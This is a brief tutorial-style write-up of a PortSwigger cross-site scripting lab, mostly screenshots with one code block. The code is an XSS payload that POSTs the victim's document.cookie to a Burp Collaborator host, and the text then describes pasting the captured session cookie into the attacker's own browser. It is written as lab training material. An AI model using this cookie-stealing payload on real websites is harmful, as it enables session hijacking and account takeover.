## Welcome, my friend. Today we will start the [31. XSS lab](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack) in ```portswigger```
### Let's play this lab:

![image](https://github.com/user-attachments/assets/edff2a48-834a-41f5-ba24-3640878a4a95)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/5be0aa2a-f41e-4db4-bf97-7a45c68e4e05)



### So we will using ```Collaborator``` in burp suite:

```
<script>
fetch('https://0st8tp3tooa6kz65vktmbqm8szyqmha6.oastify.com', // this is our url in Collaborator
{  
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

![image](https://github.com/user-attachments/assets/22a5b90e-dc7f-4287-a342-698b99631de4)

### Inside ```Collaborator``` in burp suite:

![image](https://github.com/user-attachments/assets/d69a7a6b-1515-4fb5-8a8e-dc96cb02858f)

### Copy this session and add in your session:

![image](https://github.com/user-attachments/assets/47efbfa1-6ba7-4d9d-8b0f-1db658654376)

![image](https://github.com/user-attachments/assets/b68a0f8d-380e-410a-825b-e4d5ff8e81b6)

-------

### Done! Congratulations, friends❤️‍🔥


<p align="center">
<img src="https://github.com/user-attachments/assets/005cac22-a8a2-4737-a170-ffc300cd2a7c" >
</p>
